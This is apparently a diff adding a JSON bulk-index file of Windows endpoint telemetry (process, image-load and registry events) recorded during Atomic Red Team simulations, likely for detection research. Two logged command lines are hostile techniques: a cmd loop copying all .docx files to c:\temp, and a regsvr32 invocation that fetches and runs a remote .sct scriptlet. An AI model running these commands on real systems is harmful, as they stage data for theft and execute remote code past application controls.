@@ -1,0 +1,300 @@
+{"index":{}}
+{ "command_line": "\"C:\\WINDOWS\\system32\\cmd.exe\" /c \"for /R c: %%f in (*.docx) do copy %%f c:\\temp\\\"", "event_type": "process", "logon_id": 217055, "parent_process_name": "powershell.exe", "parent_process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 2012, "ppid": 7036, "process_name": "cmd.exe", "process_path": "C:\\Windows\\System32\\cmd.exe", "subtype": "create", "timestamp": 131883571822010000, "unique_pid": "{42FC7E13-CB3E-5C05-0000-0010A0125101}", "unique_ppid": "{42FC7E13-C11D-5C05-0000-0010C6E90401}", "user": "ART-DESKTOP\\bob", "user_domain": "ART-DESKTOP", "user_name": "bob" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "cmd.exe", "image_path": "C:\\Windows\\System32\\cmd.exe", "pid": 2012, "process_name": "cmd.exe", "process_path": "C:\\Windows\\System32\\cmd.exe", "timestamp": 131883571821990000, "unique_pid": "{42FC7E13-CB3E-5C05-0000-0010A0125101}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "ntdll.dll", "image_path": "C:\\Windows\\System32\\ntdll.dll", "pid": 2012, "process_name": "cmd.exe", "process_path": "C:\\Windows\\System32\\cmd.exe", "timestamp": 131883571821990000, "unique_pid": "{42FC7E13-CB3E-5C05-0000-0010A0125101}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "kernel32.dll", "image_path": "C:\\Windows\\System32\\kernel32.dll", "pid": 2012, "process_name": "cmd.exe", "process_path": "C:\\Windows\\System32\\cmd.exe", "timestamp": 131883571821990000, "unique_pid": "{42FC7E13-CB3E-5C05-0000-0010A0125101}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "KernelBase.dll", "image_path": "C:\\Windows\\System32\\KernelBase.dll", "pid": 2012, "process_name": "cmd.exe", "process_path": "C:\\Windows\\System32\\cmd.exe", "timestamp": 131883571821990000, "unique_pid": "{42FC7E13-CB3E-5C05-0000-0010A0125101}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "msvcrt.dll", "image_path": "C:\\Windows\\System32\\msvcrt.dll", "pid": 2012, "process_name": "cmd.exe", "process_path": "C:\\Windows\\System32\\cmd.exe", "timestamp": 131883571821990000, "unique_pid": "{42FC7E13-CB3E-5C05-0000-0010A0125101}" }
+{"index":{}}
+{ "event_type": "process", "pid": 2012, "process_name": "cmd.exe", "process_path": "C:\\Windows\\System32\\cmd.exe", "subtype": "terminate", "timestamp": 131883571822140000, "unique_pid": "{42FC7E13-CB3E-5C05-0000-0010A0125101}" }
+{"index":{}}
+{ "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll", "event_type": "process", "logon_id": 217055, "parent_process_name": "cmd.exe", "parent_process_path": "C:\\Windows\\System32\\cmd.exe", "pid": 2012, "ppid": 2652, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "subtype": "create", "timestamp": 131883573237130000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}", "unique_ppid": "{42FC7E13-CBCB-5C05-0000-0010AA385401}", "user": "ART-DESKTOP\\bob", "user_domain": "ART-DESKTOP", "user_name": "bob" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "regsvr32.exe", "image_path": "C:\\Windows\\System32\\regsvr32.exe", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "ntdll.dll", "image_path": "C:\\Windows\\System32\\ntdll.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "kernel32.dll", "image_path": "C:\\Windows\\System32\\kernel32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "KernelBase.dll", "image_path": "C:\\Windows\\System32\\KernelBase.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "apphelp.dll", "image_path": "C:\\Windows\\System32\\apphelp.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "AcLayers.dll", "image_path": "C:\\Windows\\System32\\AcLayers.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "msvcrt.dll", "image_path": "C:\\Windows\\System32\\msvcrt.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "user32.dll", "image_path": "C:\\Windows\\System32\\user32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "win32u.dll", "image_path": "C:\\Windows\\System32\\win32u.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "gdi32.dll", "image_path": "C:\\Windows\\System32\\gdi32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "gdi32full.dll", "image_path": "C:\\Windows\\System32\\gdi32full.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "msvcp_win.dll", "image_path": "C:\\Windows\\System32\\msvcp_win.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "ucrtbase.dll", "image_path": "C:\\Windows\\System32\\ucrtbase.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "shlwapi.dll", "image_path": "C:\\Windows\\System32\\shlwapi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "combase.dll", "image_path": "C:\\Windows\\System32\\combase.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "rpcrt4.dll", "image_path": "C:\\Windows\\System32\\rpcrt4.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "bcryptprimitives.dll", "image_path": "C:\\Windows\\System32\\bcryptprimitives.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "sfc.dll", "image_path": "C:\\Windows\\System32\\sfc.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "winspool.drv", "image_path": "C:\\Windows\\System32\\winspool.drv", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "kernel.appcore.dll", "image_path": "C:\\Windows\\System32\\kernel.appcore.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "propsys.dll", "image_path": "C:\\Windows\\System32\\propsys.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "oleaut32.dll", "image_path": "C:\\Windows\\System32\\oleaut32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "SHCore.dll", "image_path": "C:\\Windows\\System32\\SHCore.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237140000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "sechost.dll", "image_path": "C:\\Windows\\System32\\sechost.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237300000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "IPHLPAPI.DLL", "image_path": "C:\\Windows\\System32\\IPHLPAPI.DLL", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237300000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "bcrypt.dll", "image_path": "C:\\Windows\\System32\\bcrypt.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237300000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "sfc.dll", "image_path": "C:\\Windows\\System32\\sfc.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237300000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "sfc_os.dll", "image_path": "C:\\Windows\\System32\\sfc_os.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237300000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "imm32.dll", "image_path": "C:\\Windows\\System32\\imm32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237300000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "ole32.dll", "image_path": "C:\\Windows\\System32\\ole32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237300000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "uxtheme.dll", "image_path": "C:\\Windows\\System32\\uxtheme.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237300000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "scrobj.dll", "image_path": "C:\\Windows\\System32\\scrobj.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "advapi32.dll", "image_path": "C:\\Windows\\System32\\advapi32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "urlmon.dll", "image_path": "C:\\Windows\\System32\\urlmon.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "windows.storage.dll", "image_path": "C:\\Windows\\System32\\windows.storage.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "profapi.dll", "image_path": "C:\\Windows\\System32\\profapi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "powrprof.dll", "image_path": "C:\\Windows\\System32\\powrprof.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "iertutil.dll", "image_path": "C:\\Windows\\System32\\iertutil.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "fltLib.dll", "image_path": "C:\\Windows\\System32\\fltLib.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "cryptbase.dll", "image_path": "C:\\Windows\\System32\\cryptbase.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "dwmapi.dll", "image_path": "C:\\Windows\\System32\\dwmapi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237450016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "sspicli.dll", "image_path": "C:\\Windows\\System32\\sspicli.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "ws2_32.dll", "image_path": "C:\\Windows\\System32\\ws2_32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "OnDemandConnRouteHelper.dll", "image_path": "C:\\Windows\\System32\\OnDemandConnRouteHelper.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "winhttp.dll", "image_path": "C:\\Windows\\System32\\winhttp.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap", "registry_value": "ZoneMap", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass", "registry_value": "ProxyBypass", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName", "registry_value": "IntranetName", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet", "registry_value": "UNCAsIntranet", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect", "registry_value": "AutoDetect", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass", "registry_value": "ProxyBypass", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName", "registry_value": "IntranetName", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet", "registry_value": "UNCAsIntranet", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect", "registry_value": "AutoDetect", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "nsi.dll", "image_path": "C:\\Windows\\System32\\nsi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238080000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "mswsock.dll", "image_path": "C:\\Windows\\System32\\mswsock.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238080000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "winnsi.dll", "image_path": "C:\\Windows\\System32\\winnsi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238080000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "crypt32.dll", "image_path": "C:\\Windows\\System32\\crypt32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238080000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "msasn1.dll", "image_path": "C:\\Windows\\System32\\msasn1.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "dpapi.dll", "image_path": "C:\\Windows\\System32\\dpapi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "wintrust.dll", "image_path": "C:\\Windows\\System32\\wintrust.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "cryptsp.dll", "image_path": "C:\\Windows\\System32\\cryptsp.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "rsaenh.dll", "image_path": "C:\\Windows\\System32\\rsaenh.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\WinTrust\\Trust Providers", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\WinTrust\\Trust Providers\\Software Publishing", "registry_value": "Software Publishing", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT", "registry_value": "ROOT", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT", "registry_value": "ROOT", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\AuthRoot", "registry_value": "AuthRoot", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root", "registry_value": "Root", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root", "registry_value": "Root", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
